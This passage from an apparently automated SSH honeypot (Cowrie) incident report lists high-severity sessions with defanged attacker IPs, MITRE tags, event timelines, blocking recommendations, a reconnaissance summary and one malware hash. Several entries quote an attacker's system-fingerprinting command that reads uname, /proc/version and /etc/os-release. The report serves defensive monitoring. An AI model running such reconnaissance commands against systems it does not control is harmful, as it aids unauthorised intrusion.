
| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 04:33 |
| **Last Seen** | 2026-07-04 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:33:37` | `cowrie.session.connect` |
| `2026-07-04 04:33:37` | `cowrie.client.version` |
| `2026-07-04 04:33:37` | `cowrie.client.kex` |
| `2026-07-04 04:33:38` | `cowrie.login.success` |
| `2026-07-04 04:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2e6e0a3db35

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 04:33 |
| **Last Seen** | 2026-07-04 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:33:39` | `cowrie.session.connect` |
| `2026-07-04 04:33:39` | `cowrie.client.version` |
| `2026-07-04 04:33:39` | `cowrie.client.kex` |
| `2026-07-04 04:33:40` | `cowrie.login.success` |
| `2026-07-04 04:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef76a7b0d9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:33 |
| **Last Seen** | 2026-07-04 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:33:43` | `cowrie.session.connect` |
| `2026-07-04 04:33:43` | `cowrie.client.version` |
| `2026-07-04 04:33:43` | `cowrie.client.kex` |
| `2026-07-04 04:33:43` | `cowrie.login.success` |
| `2026-07-04 04:33:44` | `cowrie.session.params` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.command.success` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.command.input` |
| `2026-07-04 04:33:44` | `cowrie.log.closed` |
| `2026-07-04 04:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe7fe899785

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:35 |
| **Last Seen** | 2026-07-04 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:35:31` | `cowrie.session.connect` |
| `2026-07-04 04:35:31` | `cowrie.client.version` |
| `2026-07-04 04:35:32` | `cowrie.client.kex` |
| `2026-07-04 04:35:32` | `cowrie.login.success` |
| `2026-07-04 04:35:33` | `cowrie.session.params` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.command.success` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.command.input` |
| `2026-07-04 04:35:33` | `cowrie.log.closed` |
| `2026-07-04 04:35:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c11191e204e9

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-04 04:36 |
| **Last Seen** | 2026-07-04 04:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:36:09` | `cowrie.session.connect` |
| `2026-07-04 04:36:09` | `cowrie.client.version` |
| `2026-07-04 04:36:09` | `cowrie.client.kex` |
| `2026-07-04 04:36:10` | `cowrie.login.success` |
| `2026-07-04 04:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f755670751b4

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-04 04:36 |
| **Last Seen** | 2026-07-04 04:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:36:12` | `cowrie.session.connect` |
| `2026-07-04 04:36:12` | `cowrie.client.version` |
| `2026-07-04 04:36:12` | `cowrie.client.kex` |
| `2026-07-04 04:36:13` | `cowrie.login.success` |
| `2026-07-04 04:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29092ccdb871

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:40 |
| **Last Seen** | 2026-07-04 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:40:01` | `cowrie.session.connect` |
| `2026-07-04 04:40:01` | `cowrie.client.version` |
| `2026-07-04 04:40:01` | `cowrie.client.kex` |
| `2026-07-04 04:40:02` | `cowrie.login.success` |
| `2026-07-04 04:40:02` | `cowrie.session.params` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.command.success` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.command.input` |
| `2026-07-04 04:40:02` | `cowrie.log.closed` |
| `2026-07-04 04:40:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d26b267e9c8f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:40 |
| **Last Seen** | 2026-07-04 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:40:14` | `cowrie.session.connect` |
| `2026-07-04 04:40:14` | `cowrie.client.version` |
| `2026-07-04 04:40:14` | `cowrie.client.kex` |
| `2026-07-04 04:40:15` | `cowrie.login.success` |
| `2026-07-04 04:40:16` | `cowrie.session.params` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.command.success` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.command.input` |
| `2026-07-04 04:40:16` | `cowrie.log.closed` |
| `2026-07-04 04:40:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c224a26c1f1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:44 |
| **Last Seen** | 2026-07-04 04:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:44:55` | `cowrie.session.connect` |
| `2026-07-04 04:44:55` | `cowrie.client.version` |
| `2026-07-04 04:44:55` | `cowrie.client.kex` |
| `2026-07-04 04:44:55` | `cowrie.login.success` |
| `2026-07-04 04:44:56` | `cowrie.session.params` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.command.success` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.command.input` |
| `2026-07-04 04:44:56` | `cowrie.log.closed` |
| `2026-07-04 04:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eac33120b6e7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 04:45 |
| **Last Seen** | 2026-07-04 04:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:45:18` | `cowrie.session.connect` |
| `2026-07-04 04:45:19` | `cowrie.client.version` |
| `2026-07-04 04:45:19` | `cowrie.client.kex` |
| `2026-07-04 04:45:26` | `cowrie.login.success` |
| `2026-07-04 04:45:29` | `cowrie.session.params` |
| `2026-07-04 04:45:29` | `cowrie.command.input` |
| `2026-07-04 04:45:30` | `cowrie.log.closed` |
| `2026-07-04 04:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba602ab5a2f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:46 |
| **Last Seen** | 2026-07-04 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:46:35` | `cowrie.session.connect` |
| `2026-07-04 04:46:35` | `cowrie.client.version` |
| `2026-07-04 04:46:35` | `cowrie.client.kex` |
| `2026-07-04 04:46:36` | `cowrie.login.success` |
| `2026-07-04 04:46:36` | `cowrie.session.params` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:36` | `cowrie.command.success` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:36` | `cowrie.command.input` |
| `2026-07-04 04:46:37` | `cowrie.log.closed` |
| `2026-07-04 04:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2443b8fd424

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:49 |
| **Last Seen** | 2026-07-04 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:49:36` | `cowrie.session.connect` |
| `2026-07-04 04:49:36` | `cowrie.client.version` |
| `2026-07-04 04:49:36` | `cowrie.client.kex` |
| `2026-07-04 04:49:37` | `cowrie.login.success` |
| `2026-07-04 04:49:37` | `cowrie.session.params` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:37` | `cowrie.command.success` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:37` | `cowrie.command.input` |
| `2026-07-04 04:49:38` | `cowrie.log.closed` |
| `2026-07-04 04:49:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc18d0531487

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 04:53 |
| **Last Seen** | 2026-07-04 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:53:02` | `cowrie.session.connect` |
| `2026-07-04 04:53:02` | `cowrie.client.version` |
| `2026-07-04 04:53:02` | `cowrie.client.kex` |
| `2026-07-04 04:53:03` | `cowrie.login.success` |
| `2026-07-04 04:53:04` | `cowrie.session.params` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.command.success` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.command.input` |
| `2026-07-04 04:53:04` | `cowrie.log.closed` |
| `2026-07-04 04:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a2eff62dba0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 04:54 |
| **Last Seen** | 2026-07-04 04:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 04:54:17` | `cowrie.session.connect` |
| `2026-07-04 04:54:17` | `cowrie.client.version` |
| `2026-07-04 04:54:18` | `cowrie.client.kex` |
| `2026-07-04 04:54:18` | `cowrie.login.success` |
| `2026-07-04 04:54:19` | `cowrie.session.params` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.command.success` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.command.input` |
| `2026-07-04 04:54:19` | `cowrie.log.closed` |
| `2026-07-04 04:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **9** | 2026-07-04 03:04 | 2026-07-04 04:42 | 7m | 0 | `T1592` | 🟢 LOW |
| `118.145.102[.]69` | **5** | 2026-07-04 03:03 | 2026-07-04 03:29 | 8m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]182` | **3** | 2026-07-04 03:25 | 2026-07-04 03:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]159` | **3** | 2026-07-04 03:24 | 2026-07-04 03:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.172[.]151` | **2** | 2026-07-04 03:19 | 2026-07-04 03:21 | 2m | 0 | `T1592` | 🟢 LOW |
| `121.229.25[.]10` | **2** | 2026-07-04 03:06 | 2026-07-04 03:07 | 1m | 0 | `T1592` | 🟢 LOW |
| `20.65.193[.]130` | **2** | 2026-07-04 03:50 | 2026-07-04 03:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-07-04 03:21 | 2026-07-04 03:40 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-07-04 04:44 | 2026-07-04 04:44 | 37s | 0 | `T1592` | 🟢 LOW |
| `117.50.213[.]249` | 1 | 2026-07-04 03:06 | 2026-07-04 03:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.27.128[.]176` | 1 | 2026-07-04 04:00 | 2026-07-04 04:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]167` | 1 | 2026-07-04 03:18 | 2026-07-04 03:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `208.109.242[.]255` | 1 | 2026-07-04 04:32 | 2026-07-04 04:33 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-04 03:42 | 2026-07-04 03:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-04 03:52 | 2026-07-04 03:53 | 47s | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-07-04 04:11 | 2026-07-04 04:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-07-04 04:21 | 2026-07-04 04:21 | 2s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]7` | 1 | 2026-07-04 03:01 | 2026-07-04 03:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.154.43[.]30` | 1 | 2026-07-04 04:53 | 2026-07-04 04:53 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
